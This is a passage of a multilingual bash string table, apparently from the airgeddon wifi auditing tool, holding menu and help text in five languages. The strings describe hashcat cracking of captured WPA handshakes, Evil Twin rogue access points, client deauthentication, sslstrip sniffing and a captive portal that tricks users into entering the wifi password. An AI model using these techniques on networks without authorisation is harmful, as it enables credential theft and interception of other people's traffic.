	arr["english",212]="The script is already in the latest version. It doesn't need to be updated"
	arr["spanish",212]="El script ya está en la última versión. No necesita ser actualizado"
	arr["french",212]="La dernière version du script est déjà installée. Pas de mise à jour possible"
	arr["catalan",212]="El script ja està en l'última versió. No necessita ser actualitzat"
	arr["portuguese",212]="$pending_of_translation O script já está na versão mais recente. Ele não necessita de ser actualizado"

	arr["english",213]="A new version of the script exists (v$airgeddon_last_version). It will be downloaded"
	arr["spanish",213]="Existe una nueva versión del script (v$airgeddon_last_version). Será descargada"
	arr["french",213]="Une nouvelle version du script est disponible (v$airgeddon_last_version). Lancement du téléchargement"
	arr["catalan",213]="Hi ha una nova versió dels script (v$airgeddon_last_version). Serà descarregada"
	arr["portuguese",213]="$pending_of_translation Uma nova versão do script (v$airgeddon_last_version). Vai ser descarregada"

	arr["english",214]="The new version was successfully downloaded. The script will be launched again"
	arr["spanish",214]="La nueva versión se ha descargado con éxito. El script se lanzará de nuevo"
	arr["french",214]="Le téléchargement de la dernière version du script a réussit. Le script a été lancé à nouveau"
	arr["catalan",214]="La nova versió s'ha descarregat amb èxit. El script es llençarà de nou"
	arr["portuguese",214]="$pending_of_translation A nova versão foi baixado com sucesso. O script será lançado novamente"

	arr["english",215]="WPA/WPA2 passwords always has 8 as a minimum length"
	arr["spanish",215]="Una contraseña WPA/WPA2 siempre tiene como mínimo una longitud de 8"
	arr["french",215]="Un mot de passe WPA/WPA2 a une longueur minimale de 8 caractères"
	arr["catalan",215]="Una contrasenya WPA/WPA2 sempre té com a mínim una longitud de 8"
	arr["portuguese",215]="$pending_of_translation Uma senha WPA/WPA2 sempre tem pelo menos um comprimento de 8"

	arr["english",216]="No networks found with Handshake captured on the selected file"
	arr["spanish",216]="No se encontraron redes con Handshake capturado en el fichero seleccionado"
	arr["french",216]="Aucun réseau avec son Handshake n'a été trouvé dans le fichier sélectionné"
	arr["catalan",216]="No s'han trobat xarxes amb Handshake capturat en el fitxer seleccionat"
	arr["portuguese",216]="$pending_of_translation Nenhuma rede encontrada com Handshake capturado no arquivo selecionado"

	arr["english",217]="Only one valid target detected on file. BSSID autoselected ["${normal_color}"$bssid"${blue_color}"]"
	arr["spanish",217]="Sólo un objetivo valido detectado en el fichero. Se ha seleccionado automáticamente el BSSID ["${normal_color}"$bssid"${blue_color}"]"
	arr["french",217]="Le seul réseau valide présent dans le fichier choisi a été sélectionné automatiquement, son BSSID est ["${normal_color}"$bssid"${blue_color}"]"
	arr["catalan",217]="Només un objectiu vàlid detectat en el fitxer. S'ha seleccionat automàticament el BSSID ["${normal_color}"$bssid"${blue_color}"]"
	arr["portuguese",217]="$pending_of_translation Apenas um valido objetivo detectado no arquivo. É selecionado automaticamente BSSID ["${normal_color}"$bssid"${blue_color}"]"

	arr["english",218]="Optional tools: checking..."
	arr["spanish",218]="Herramientas opcionales: comprobando..."
	arr["french",218]="Vérification de la présence des outils optionnels..."
	arr["catalan",218]="Eines opcionals: comprovant..."
	arr["portuguese",218]="$pending_of_translation ferramentas opcionais: verificação..."

	arr["english",219]="Your distro has the essential tools but it hasn't some optional. The script can continue but you can't use some features. It is recommended to install missing tools"
	arr["spanish",219]="Tu distro tiene las herramientas esenciales pero le faltan algunas opcionales. El script puede continuar pero no podrás utilizar algunas funcionalidades. Es recomendable instalar las herramientas que faltan"
	arr["french",219]="Votre système contient les outils fondamentaux nécessaires à l’exécution du script mais il manque quelques outils pour pouvoir utiliser pleinement toutes les fonctionnalités proposées par le script. Le script va pouvoir être exécuté mais il est conseillé d'installer les outils manquants."
	arr["catalan",219]="La teva distro té les eines essencials però li falten algunes opcionals. El script pot continuar però no podràs utilitzar algunes funcionalitats. És recomanable instal·lar les eines que faltin"
	arr["portuguese",219]="$pending_of_translation Seu distro tem as ferramentas essenciais, mas carece de algumas opcional. O script pode continuar, mas você não pode usar alguns recursos. É aconselhável instalar as ferramentas ausentes"

	arr["english",220]="Locked menu option was chosen"
	arr["spanish",220]="Opción del menú bloqueada"
	arr["french",220]="Cette option du menu est bloquée"
	arr["catalan",220]="Opció del menú bloquejada"
	arr["portuguese",220]="$pending_of_translation Menu de opções bloqueado"

	arr["english",221]="Accepted bash version ($BASH_VERSION). Minimum required version: $minimum_bash_version_required"
	arr["spanish",221]="Versión de bash ($BASH_VERSION) aceptada. Mínimo requerido versión: $minimum_bash_version_required"
	arr["french",221]="Votre version de bash ($BASH_VERSION) est acceptée. Version minimale requise: $minimum_bash_version_required"
	arr["catalan",221]="Versió de bash ($BASH_VERSION) acceptada. Versió minima requerida: $minimum_bash_version_required"
	arr["portuguese",221]="$pending_of_translation Versão Bash ($BASH_VERSION) aceitaram. Versão mínima exigida: $minimum_bash_version_required"

	arr["english",222]="Insufficient bash version ($BASH_VERSION). Minimum required version: $minimum_bash_version_required"
	arr["spanish",222]="Versión de bash insuficiente ($BASH_VERSION). Mínimo requerido versión: $minimum_bash_version_required"
	arr["french",222]="Votre version de bash ($BASH_VERSION) n'est pas suffisante. Version minimale requise: $minimum_bash_version_required"
	arr["catalan",222]="Versió de bash insuficient ($BASH_VERSION). Versió mínima requerida: $minimum_bash_version_required"
	arr["portuguese",222]="$pending_of_translation Versão festança insuficiente ($BASH_VERSION). Versão mínima exigida: $minimum_bash_version_required"

	arr["english",223]="Maybe the essential tools check has failed because you are not root user or don't have enough privileges. Launch the script as root user or using \"sudo\""
	arr["spanish",223]="Es posible que el chequeo de las herramientas esenciales haya fallado porque no eres usuario root o no tienes privilegios suficientes. Lanza el script como usuario root o usando \"sudo\""
	arr["french",223]="Il est possible que la vérification des outils essentiels ait échouée parce que vous n'êtes pas logué comme root ou ne disposez pas des privilèges nécessaires. Lancez le script en tant que root ou en utilisant \"sudo\""
	arr["catalan",223]="És possible que la revisió de les eines essencials hagi fallat perquè no ets usuari root o no tens privilegis suficients. Llança l'script com a usuari root o utilitzeu \"sudo\""
	arr["portuguese",223]="$pending_of_translation Talvez as ferramentas essenciais cheque falhou porque você não é raiz ou não tem privilégios suficientes. Lança o script como root ou usando \"sudo\""

	arr["english",224]="The script execution continues from exactly the same point where it was"
	arr["spanish",224]="El script continua su ejecución desde exactamente el mismo punto en el que estaba"
	arr["french",224]="L'exécution du script se poursuit à partir exactement le même point où il était"
	arr["catalan",224]="El script contínua la seva execució des d'exactament el mateix punt en el qual estava"
	arr["portuguese",224]="$pending_of_translation A execução do script continua exatamente do mesmo ponto em que foi"

	arr["english",225]="The script can't check if there is a new version because you haven't installed update tools needed"
	arr["spanish",225]="El script no puede comprobar si hay una nueva versión porque no tienes instaladas las herramientas de actualización necesarias"
	arr["french",225]="Le script ne peut pas vérifier si une nouvelle version est disponible parce que vous n'avez pas installé les outils nécessaires de mise à jour"
	arr["catalan",225]="El script no pot comprovar si hi ha una nova versió perquè no tens instal·lades les eines d'actualització necessàries"
	arr["portuguese",225]="$pending_of_translation O script não pode verificar se uma nova versão porque você instalou as ferramentas de atualização necessárias"

	arr["english",226]="Update tools: checking..."
	arr["spanish",226]="Herramientas de actualización: comprobando..."
	arr["french",226]="Vérification de la présence des outils de mise à jour..."
	arr["catalan",226]="Eines d'actualització: comprovant..."
	arr["portuguese",226]="$pending_of_translation Ferramentas de atualização: verificação..."

	arr["english",227]="Working...  "
	arr["spanish",227]="Trabajando...  "
	arr["french",227]="Travail...  "
	arr["catalan",227]="Treballant...  "
	arr["portuguese",227]="$pending_of_translation Trabalhando...  "

	arr["english",228]="                             Developed by $author"
	arr["spanish",228]="                             Programado por $author"
	arr["french",228]="                             Programmé par $author"
	arr["catalan",228]="                             Desenvolupat per $author"
	arr["portuguese",228]="                             Programado por $author"

	arr["english",229]="hashcat CPU, non GPU attacks"
	arr["spanish",229]="ataques hashcat CPU, no GPU"
	arr["french",229]="attaques hashcat CPU, pas GPU"
	arr["catalan",229]="atacs hashcat CPU, no GPU"
	arr["portuguese",229]="$pending_of_translation ataques hashcat CPU, não GPU"

	arr["english",230]="3.  (hashcat) Dictionary attack against capture file"
	arr["spanish",230]="3.  (hashcat) Ataque de diccionario sobre fichero de captura"
	arr["french",230]="3.  (hashcat) Attaque de dictionnaire en utilisant le fichier de capture"
	arr["catalan",230]="3.  (hashcat) Atac de diccionari sobre fitxer de captura"
	arr["portuguese",230]="$pending_of_translation 3.  (hashcat) Dicionário ataque em arquivo de captura"

	arr["english",231]="4.  (hashcat) Bruteforce attack against capture file"
	arr["spanish",231]="4.  (hashcat) Ataque de fuerza bruta sobre fichero de captura"
	arr["french",231]="4.  (hashcat) Attaque de force brute en utilisant le fichier de capture"
	arr["catalan",231]="4.  (hashcat) Atac de força bruta sobre fitxer de captura"
	arr["portuguese",231]="$pending_of_translation 4.  (hashcat) Ataque de força bruta em arquivo de captura"

	arr["english",232]="5.  (hashcat) Rule based attack against capture file"
	arr["spanish",232]="5.  (hashcat) Ataque basado en reglas sobre fichero de captura"
	arr["french",232]="5.  (hashcat) Attaque fondé sur des règles en utilisant le fichier de capture"
	arr["catalan",232]="5.  (hashcat) Atac basat en regles sobre el fitxer de captura"
	arr["portuguese",232]="$pending_of_translation 5.  (hashcat) Ataque com base no arquivo de captura regras"

	arr["english",233]="Type the path to store the file or press Enter to accept the default proposal "${normal_color}"[$hashcat_potpath]"
	arr["spanish",233]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$hashcat_potpath]"
	arr["french",233]="Entrez le chemin où vous voulez enregistrer le fichier ou bien appuyez sur Entrée pour utiliser le chemin proposé "${normal_color}"[$hashcat_potpath]"
	arr["catalan",233]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte "${normal_color}"[$hashcat_potpath]"
	arr["portuguese",233]="$pending_of_translation Digite o caminho onde armazenar o arquivo ou pressione Enter para aceitar as propostas padrão "${normal_color}"[$hashcat_potpath]"

	arr["english",234]="Contratulations!! It seems the key has been decrypted"
	arr["spanish",234]="Enhorabuena!! Parece que la clave ha sido desencriptada"
	arr["french",234]="Félicitations!! Il semble que la clef a été décryptée"
	arr["catalan",234]="Enhorabona!! Sembla que la clau ha estat desencriptada"
	arr["portuguese",234]="$pending_of_translation Parabéns!! Parece que a chave tenha sido descodificada"

	arr["english",235]="Do you want to save the trophy file with the decrypted password? "${normal_color}"[y/n]"
	arr["spanish",235]="¿Quieres guardar el fichero de trofeo con la clave desencriptada? "${normal_color}"[y/n]"
	arr["french",235]="Voulez-vous enregistrer le fichier trophée avec le mot de passe déchiffré? "${normal_color}"[y/n]"
	arr["catalan",235]="¿Vols desar el fitxer de trofeu amb la clau desencriptada? "${normal_color}"[y/n]"
	arr["portuguese",235]="$pending_of_translation Você quer salvar o troféu arquivo com a senha descriptografado? "${normal_color}"[y/n]"

	arr["english",236]="Hashcat trophy file generated successfully at ["${normal_color}"$potenteredpath"${blue_color}"]"
	arr["spanish",236]="Fichero de trofeo hashcat generado con éxito en ["${normal_color}"$potenteredpath"${blue_color}"]"
	arr["french",236]="Le fichier trophée Hashcat a bien été crée dans ["${normal_color}"$potenteredpath"${blue_color}"]"
	arr["catalan",236]="Fitxer de trofeu hashcat generat amb èxit a ["${normal_color}"$potenteredpath"${blue_color}"]"
	arr["portuguese",236]="$pending_of_translation Arquivo troféu Hashcat gerado com sucesso ["${normal_color}"$potenteredpath"${blue_color}"]"

	arr["english",237]="5.  Lowercase + uppercase + numeric + symbol chars"
	arr["spanish",237]="5.  Caracteres en minúsculas + mayúsculas + numéricos + símbolos"
	arr["french",237]="5.  Lettres minuscules et majuscules + chiffres + symboles"
	arr["catalan",237]="5.  Caràcters en minúscules + majúscules + numèrics + símbols"
	arr["portuguese",237]="$pending_of_translation 5.  Caracteres em minúsculas + maiúsculas + numéricos + símbolos"

	arr["english",238]="Charset selection menu"
	arr["spanish",238]="Menú de selección de juego de caracteres"
	arr["french",238]="Menu de sélection du jeu de caractères"
	arr["catalan",238]="Menú de selecció de joc de caràcters"
	arr["portuguese",238]="$pending_of_translation Charset menu de seleção"

	arr["english",239]="You already have selected a rules file during this session ["${normal_color}"$rules"${blue_color}"]"
	arr["spanish",239]="Ya tienes seleccionado un fichero de reglas en esta sesión ["${normal_color}"$rules"${blue_color}"]"
	arr["french",239]="Vous avez déjà sélectionné un fichier règles pour cette session "${normal_color}"$rules"${blue_color}"]"
	arr["catalan",239]="Ja tens seleccionat un fitxer de regles en aquesta sessió ["${normal_color}"$rules"${blue_color}"]"
	arr["portuguese",239]="$pending_of_translation Você selecionou um arquivo de regras nesta sessão ["${normal_color}"$rules"${blue_color}"]"

	arr["english",240]="Do you want to use this already selected rules file? "${normal_color}"[y/n]"
	arr["spanish",240]="¿Quieres utilizar este fichero de reglas ya seleccionado? "${normal_color}"[y/n]"
	arr["french",240]="Souhaitez vous utiliser les règles déjà sélectionné? "${normal_color}"[y/n]"
	arr["catalan",240]="¿Vols fer servir aquest fitxer de regles ja seleccionat? "${normal_color}"[y/n]"
	arr["portuguese",240]="$pending_of_translation Você quer usar esse arquivo regras já selecionados? "${normal_color}"[y/n]"

	arr["english",241]="The path to the rules file is valid. Script can continue..."
	arr["spanish",241]="La ruta al fichero de reglas es válida. El script puede continuar..."
	arr["french",241]="Le chemin vers le fichier règles est valide. Le script peut continuer..."
	arr["catalan",241]="La ruta cap al fitxer de regles és vàlida. El script pot continuar..."
	arr["portuguese",241]="$pending_of_translation O caminho para o arquivo de regras é válido. O script pode continuar..."

	arr["english",242]="Enter the path of a rules file :"
	arr["spanish",242]="Introduce la ruta de un fichero de reglas :"
	arr["french",242]="Saisissez un chemin vers un fichier règles d'attaque :"
	arr["catalan",242]="Introdueix la ruta d'un fitxer de regles :"
	arr["portuguese",242]="$pending_of_translation Digite o caminho para um arquivo de regras :"

	arr["english",243]="Selected rules file: "${pink_color}"$rules"${normal_color}
	arr["spanish",243]="Fichero de reglas seleccionado: "${pink_color}"$rules"${normal_color}
	arr["french",243]="Fichier règles sélectionné: "${pink_color}"$rules"${normal_color}
	arr["catalan",243]="Fitxer de regles seleccionat: "${pink_color}"$rules"${normal_color}
	arr["portuguese",243]="$pending_of_translation Crquivo regras selecionadas: "${pink_color}"$rules"${normal_color}

	arr["english",244]="Rule based attacks change the words of the dictionary list according to the rules written in the rules file itself. They are very useful. Some distros has predefined rule files (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["spanish",244]="Los ataques basados en reglas modifican las palabras de la lista del diccionario según las reglas escritas en el propio fichero de reglas. Son muy útiles. Algunas distros ya traen ficheros predefinidos de reglas (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["french",244]="Les attaques basées sur des règles modifient les mots du dictionnaire selon les règles établies dans le fichier règles. Ils sont très utiles. Certaines distros comportent des fichiers de règles prédéfinies (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["catalan",244]="Els atacs basats en regles modifiquen les paraules de la llista del diccionari segons les regles escrites en el propi fitxer de regles. Són molt útils. Algunes distros ja porten fitxers de regles predefinits (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"
	arr["portuguese",244]="$pending_of_translation Ataques baseados em regras mudaram as palavras da lista de dicionários de acordo com as regras escritas nas regras de arquivo em si. Eles são muito úteis. Algumas distros já regras predefinidas trazer arquivos (Kali: /usr/share/hashcat/rules // Wifislax: /opt/hashcat/rules)"

	arr["english",245]="// "${yellow_color}"Chipset:"${normal_color}" $unknown_chipsetvar"
	arr["spanish",245]="// "${yellow_color}"Chipset:"${normal_color}" $unknown_chipsetvar"
	arr["french",245]="// "${yellow_color}"Chipset:"${normal_color}" $unknown_chipsetvar"
	arr["catalan",245]="// "${yellow_color}"Chipset:"${normal_color}" $unknown_chipsetvar"
	arr["portuguese",245]="// "${yellow_color}"Chipset:"${normal_color}" $unknown_chipsetvar"

	arr["english",246]="Every time you see a text with the prefix "${cyan_color}"$pending_of_translation"${pink_color}" acronym for \"Pending of Translation\", means the translation has been automatically generated and is still pending of review"
	arr["spanish",246]="Cada vez que veas un texto con el prefijo "${cyan_color}"$pending_of_translation"${pink_color}" acrónimo de \"Pending of Translation\", significa que su traducción ha sido generada automáticamente y que aún está pendiente de revisión"
	arr["french",246]="Chaque fois que vous voyez un texte précédé par "${cyan_color}"$pending_of_translation"${pink_color}" acronyme de \"Pending of Translation\" cela signifie que la traduction a été faite automatiquement et est en attente de correction"
	arr["catalan",246]="Cada vegada que vegis un text amb el prefix "${cyan_color}"$pending_of_translation"${pink_color}" acrònim de \"Pending of Translation\", vol dir que la traducció ha estat generada automàticament i encara està pendent de revisió"
	arr["portuguese",246]="$pending_of_translation Cada vez que você vê um texto com o prefixo "${cyan_color}"$pending_of_translation"${pink_color}" acrônimo para \"Pending of Translation\" significa que a tradução foi gerado automaticamente e ainda está pendente de revisão"

	arr["english",247]="Despite having all essential tools installed, your system uses airmon-zc instead of airmon-ng. In order to work properly you need to install ethtool and you don't have it right now. Please, install it and launch the script again"
	arr["spanish",247]="A pesar de tener todas las herramientas esenciales instaladas, tu sistema usa airmon-zc en lugar de airmon-ng. Para poder funcionar necesitas tener instalado ethtool y tú no lo tienes en este momento. Por favor, instálalo y vuelve a lanzar el script"
	arr["french",247]="En dépit d'avoir tous les outils essentiels installés votre système utilise airmon-zc au lieu de airmon-ng. Vous devez installer ethtool que vous n'avez pas à ce moment. S'il vous plaît, installez-le et relancez le script"
	arr["catalan",247]="Tot i tenir totes les eines essencials instal·lades, el teu sistema fa servir airmon-zc en lloc del airmon-ng. Per poder funcionar necessites tenir instal·lat ethtool i tu no el tens en aquest moment. Si us plau, instal·la-ho i torna a executar el script"
	arr["portuguese",247]="$pending_of_translation Apesar de ter todas as ferramentas essenciais instalado, o sistema utiliza airmon-zc vez de airmon-ng. Para funcionar você precisa instalar ethtool e você não tem neste momento. Por favor, instale e execute o script novamente"

	arr["english",248]="Language changed to Portuguese"
	arr["spanish",248]="Idioma cambiado a Portugués"
	arr["french",248]="Le script sera maintenant en Portugais"
	arr["catalan",248]="Idioma canviat a Portuguès"
	arr["portuguese",248]="$pending_of_translation Idioma alterado para Português"

	arr["english",249]="5.  Portuguese"
	arr["spanish",249]="5.  Portugués"
	arr["french",249]="5.  Portugais"
	arr["catalan",249]="5.  Portuguès"
	arr["portuguese",249]="5.  Português"

	arr["english",250]="If you see any bad translation or just want "${cyan_color}"$pending_of_translation"${pink_color}" marks to dissapear, write me to $mail to collaborate with translations"
	arr["spanish",250]="Si ves alguna traducción incorrecta o quieres que desparezcan las marcas "${cyan_color}"$pending_of_translation"${pink_color}", escríbeme a $mail para colaborar con las traducciones"
	arr["french",250]="Si vous voyez des erreurs contresens ou voulez voir les marques "${cyan_color}"$pending_of_translation"${pink_color}" disparaitre, écrivez à $mail pour collaborer avec les traductions"
	arr["catalan",250]="Si veus alguna traducció incorrecta o vols que desapareguin les marques "${cyan_color}"$pending_of_translation"${pink_color}", escriu-me a $mail per col·laborar amb les traduccions"
	arr["portuguese",250]="$pending_of_translation Se você ver qualquer erro de tradução ou quer marcas "${cyan_color}"$pending_of_translation"${pink_color}", escreva para $mail para colaborar com traduções desaparecer"

	arr["english",251]="You have chosen the same language that was selected. No changes will be done"
	arr["spanish",251]="Has elegido el mismo idioma que estaba seleccionado. No se realizarán cambios"
	arr["french",251]="Vous venez de choisir la langue qui est en usage. Pas de changements"
	arr["catalan",251]="Has triat el mateix idioma que estava seleccionat. No es realitzaran canvis"
	arr["portuguese",251]="$pending_of_translation Você escolheu o mesmo idioma que foi selecionado. Nenhuma alteração será feita"

	arr["english",252]="7.  Evil Twin attacks menu"
	arr["spanish",252]="7.  Menú de ataques Evil Twin"
	arr["french",252]="7.  Menu des attaques Evil Twin"
	arr["catalan",252]="7.  Menú d'atacs Evil Twin"
	arr["portuguese",252]="$pending_of_translation 7.  Ataques Evil Twin menu"

	arr["english",253]="Evil Twin attacks menu"
	arr["spanish",253]="Menú de ataques Evil Twin"
	arr["french",253]="Menu des attaques Evil Twin"
	arr["catalan",253]="Menú d'atacs Evil Twin"
	arr["portuguese",253]="$pending_of_translation Ataques Evil Twin menu"

	arr["english",254]="In order to use the Evil Twin just AP and sniffing attacks, you must have another one interface in addition to the wifi network interface will become the AP, which will provide internet access to other clients on the network. This doesn't need to be wifi, can be ethernet"
	arr["spanish",254]="Para utilizar los ataques de Evil Twin de solo AP y con sniffing, deberás tener además de la interfaz wifi que se transformará en el AP, otra interfaz de red con acceso a internet para proporcionar este servicio a otros clientes de la red. Esta no hace falta que sea wifi, puede ser ethernet"
	arr["french",254]="Pour effectuer l'attaque Evil Twin combinant Rogue AP et capture des données vous avez besoin d'une interface réseau en plus de celle utilisée pour créer le point d'accès. Cette interface supplémentaire devra être connecté à l'Internet afin d'en proportionner l'accès aux clients du réseau. L'interface peut être une interface ethernet ou wifi"
	arr["catalan",254]="Per utilitzar els atacs d'Evil Twin només amb AP i sniffing, hauràs de tenir a més de la interfície wifi que es transformarà en el AP, una altre interfície de xarxa amb accés a internet per proporcionar aquest servei a altres clients de la xarxa. Aquesta no cal que sigui wifi, pot ser ethernet"
	arr["portuguese",254]="$pending_of_translation Para usar ataques Evil Twin única AP e sniffing, você deve ter além da interface wifi que se tornará a AP, uma outra interface de rede com acesso à internet para fornecer este serviço a outros clientes da rede. Isso não precisa ser wifi, pode ser ethernet"

	arr["english",255]="without sniffing, just AP"
	arr["spanish",255]="sin sniffing, solo AP"
	arr["french",255]="rogue AP sans capture des données"
	arr["catalan",255]="sense sniffing, només AP"
	arr["portuguese",255]="$pending_of_translation sem sniffing, única AP"

	arr["english",256]="5.  Evil Twin attack just AP"
	arr["spanish",256]="5.  Ataque Evil Twin solo AP"
	arr["french",256]="5.  Attaque Evil Twin Rogue AP simple"
	arr["catalan",256]="5.  Atac Evil Twin només AP"
	arr["portuguese",256]="$pending_of_translation 5.  Ataque Evil Twin só AP"

	arr["english",257]="with sniffing"
	arr["spanish",257]="con sniffing"
	arr["french",257]="avec capture des données"
	arr["catalan",257]="amb sniffing"
	arr["portuguese",257]="$pending_of_translation com sniffing"

	arr["english",258]="If you use the attack without sniffing, just AP, you'll can use any external to script sniffer software"
	arr["spanish",258]="Si utilizas el ataque sin sniffing, solo AP, podrás usar cualquier programa sniffer externo al script"
	arr["french",258]="Si vous lancez l'attaque sans capture des données (Rogue AP) vous pouvez utiliser un programme externe pour les capturer"
	arr["catalan",258]="Si utilitzes l'atac sense sniffing, només AP, podràs fer servir qualsevol programa sniffer extern a l'script"
	arr["portuguese",258]="$pending_of_translation Se você usar o ataque sem sniffing, apenas a AP, você pode usar qualquer programa sniffer externo ao script"

	arr["english",259]="6.  Evil Twin AP attack with sniffing"
	arr["spanish",259]="6.  Ataque Evil Twin AP con sniffing"
	arr["french",259]="6.  Attaque Evil Twin avec Rogue AP et capture des données"
	arr["catalan",259]="6.  Atac Evil Twin AP amb sniffing"
	arr["portuguese",259]="$pending_of_translation 6.  Ataque Evil Twin AP com sniffing"

	arr["english",260]="9.  Return to main menu"
	arr["spanish",260]="9.  Volver al menú principal"
	arr["french",260]="9.  Retourner au menu principal"
	arr["catalan",260]="9.  Tornar al menú principal"
	arr["portuguese",260]="$pending_of_translation 9.  Volte ao menu principal"

	arr["english",261]="7.  Evil Twin AP attack with sniffing and sslstrip"
	arr["spanish",261]="7.  Ataque Evil Twin AP con sniffing y sslstrip"
	arr["french",261]="7.  Attaque Evil Twin avec capture des données et sslstrip"
	arr["catalan",261]="7.  Atac Evil Twin AP amb sniffing i sslstrip"
	arr["portuguese",261]="$pending_of_translation 7.  Ataque Evil Twin AP com sniffing e sslstrip"

	arr["english",262]="without sniffing, captive portal"
	arr["spanish",262]="sin sniffing, portal cautivo"
	arr["french",262]="sans capture des données avec portail captif"
	arr["catalan",262]="sense sniffing, portal captiu"
	arr["portuguese",262]="$pending_of_translation sem sniffing, portal cativo"

	arr["english",263]="8.  Evil Twin AP attack with captive portal"
	arr["spanish",263]="8.  Ataque Evil Twin AP con portal cautivo"
	arr["french",263]="8.  Attaque Evil Twin avec portail captif"
	arr["catalan",263]="8.  Atac Evil Twin AP amb portal captiu"
	arr["portuguese",263]="$pending_of_translation 8.  Ataque Evil Twin AP com portal cativo"

	arr["english",264]="The captive portal attack tries to one of the network clients provide us the password for the wifi network by entering it on our portal"
	arr["spanish",264]="El ataque del portal cautivo intentará conseguir que uno de los clientes de la red nos proporcione la contraseña de la red wifi introduciéndola en nuestro portal"
	arr["french",264]="Le portail captif d'attaque tente d'obtenir l'un des clients du réseau nous fournir le mot de passe pour le réseau sans fil en entrant sur notre site"
	arr["catalan",264]="L'atac de portal captiu intenta aconseguir que un dels clients de la xarxa ens proporcioni la contrasenya de la xarxa wifi introduint-la al nostre portal"
	arr["portuguese",264]="$pending_of_translation O portal cativo ataque tenta fazer com que um dos clientes da rede nos fornecer a senha para a rede sem fio digitando-o em nosso site"

	arr["english",265]="Evil Twin deauth"
	arr["spanish",265]="Desautenticación para Evil Twin"
	arr["french",265]="Dés-authentification pour Evil Twin"
	arr["catalan",265]="Desautenticació per Evil Twin"
	arr["portuguese",265]="$pending_of_translation Deauth para Evil Twin"

	arr["english",266]="4.  Return to Evil Twin attacks menu"
	arr["spanish",266]="4.  Volver al menú de ataques Evil Twin"
	arr["french",266]="4.  Retour au menu d'attaques Evil Twin"
	arr["catalan",266]="4.  Tornar al menú d'atacs Evil Twin"
	arr["portuguese",266]="$pending_of_translation 4.  Voltar ao menu ataques Evil Twin"

	arr["english",267]="If you can't deauth clients from an AP using an attack, choose another one :)"
	arr["spanish",267]="Si no consigues desautenticar a los clientes de un AP con un ataque, elige otro :)"
	arr["french",267]="Si vous ne pouvez pas dé-authentifier des clients avec une attaque, choisissez-en une autre :)"
	arr["catalan",267]="Si no aconsegueixes desautenticar als clients d'un AP amb un atac, tria un altre :)"
	arr["portuguese",267]="$pending_of_translation Se você não pode clientes de-autenticar um AP com um ataque, escolha outro :)"

	arr["english",268]="With this attack, we'll try to deauth clients from the legitimate AP. Hopefully they'll reconnect to our Evil Twin AP"
	arr["spanish",268]="Con este ataque, intentaremos desautenticar a los clientes del AP legítimo. Con suerte reconectarán pero a nuestro Evil Twin AP"
	arr["french",268]="Avec cette attaque nous essayons de déconnecter des clients du point d'accès légitime en espérant qu'ils se connectent au notre Evil Twin AP"
	arr["catalan",268]="Amb aquest atac, intentarem desautenticar als clients del AP legítim. Amb sort reconectarán però al nostre Evil Twin AP"
	arr["portuguese",268]="$pending_of_translation Com este ataque, tentamos clientes de autenticação de legítima do AP. Esperemos que eles se reconectar mas o nosso Evil Twin AP"

	arr["english",269]="To perform an Evil Twin attack you'll need to be very close to the target AP or have a very powerful wifi antenna. Your signal must reach clients equally strong or more than the legitimate AP"
	arr["spanish",269]="Para realizar un ataque Evil Twin necesitarás estar muy cerca del AP objetivo o tener una antena wifi muy potente. Tu señal ha de llegar a los clientes igual de fuerte o más que la del AP legítimo"
	arr["french",269]="Pour mener à bien une attaque Evil Twin il vous faut être dans de bonnes conditions d'émission et de réception tantôt avec le point d'accès qu'avec le(s) client(s)"
	arr["catalan",269]="Per realitzar un atac Evil Twin et caldrà estar molt a prop de l'AP objectiu o tenir una antena wifi molt potent. El teu senyal ha d'arribar als clients igual de fort o més que la de l'AP legítim"
	arr["portuguese",269]="$pending_of_translation Para fazer um ataque Evil Twin precisa estar perto da AP-alvo ou ter uma antena wifi muito poderosa. Seu sinal deve atingir os clientes igualmente forte ou mais do que o legítimo AP"

	arr["english",270]="Evil Twin attack just AP"
	arr["spanish",270]="Ataque Evil Twin solo AP"
	arr["french",270]="Attaque Evil Twin Rogue AP simple"
	arr["catalan",270]="Atac Evil Twin només AP"
	arr["portuguese",270]="$pending_of_translation Ataque Evil Twin só AP"

	arr["english",271]="Selected BSSID: "${pink_color}"None"${normal_color}
	arr["spanish",271]="BSSID seleccionado: "${pink_color}"Ninguno"${normal_color}
	arr["french",271]="BSSID sélectionné: "${pink_color}"Aucun"${normal_color}
	arr["catalan",271]="BSSID seleccionat: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",271]="$pending_of_translation BSSID selecionado: "${pink_color}"Nenhum"${normal_color}

	arr["english",272]="Deauthentication chosen method: "${pink_color}"$et_dos_attack"${normal_color}
	arr["spanish",272]="Método elegido de desautenticación: "${pink_color}"$et_dos_attack"${normal_color}
	arr["french",272]="Méthode de dés-authentification: "${pink_color}"$et_dos_attack"${normal_color}
	arr["catalan",272]="Mètode elegit d'desautenticació: "${pink_color}"$et_dos_attack"${normal_color}
	arr["portuguese",272]="$pending_of_translation Método escolhido deauth: "${pink_color}"$et_dos_attack"${normal_color}

	arr["english",273]="Selected channel: "${pink_color}"None"${normal_color}
	arr["spanish",273]="Canal seleccionado: "${pink_color}"Ninguno"${normal_color}
	arr["french",273]="Canal sélectionné: "${pink_color}"Aucun"${normal_color}
	arr["catalan",273]="Canal seleccionat: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",273]="$pending_of_translation Canal selecionado: "${pink_color}"Nenhum"${normal_color}

	arr["english",274]="Selected ESSID: "${pink_color}"None"${normal_color}
	arr["spanish",274]="ESSID seleccionado: "${pink_color}"Ninguno"${normal_color}
	arr["french",274]="ESSID sélectionné: "${pink_color}"Aucun"${normal_color}
	arr["catalan",274]="ESSID seleccionat: "${pink_color}"Ningú"${normal_color}
	arr["portuguese",274]="$pending_of_translation ESSID selecionado: "${pink_color}"Nenhum"${normal_color}

	arr["english",275]="In addition to the software requirements that already meet if you get here, you need to provide target AP data to carry out the attack"
	arr["spanish",275]="Además de los requisitos de software, que ya cumples si has llegado hasta aquí, es necesario proporcionar los datos del AP objetivo para llevar a cabo el ataque"
	arr["french",275]="Maintenant que les dépendances ont étés vérifiées il vous faut saisir les donnés sur le point d'accès cible"
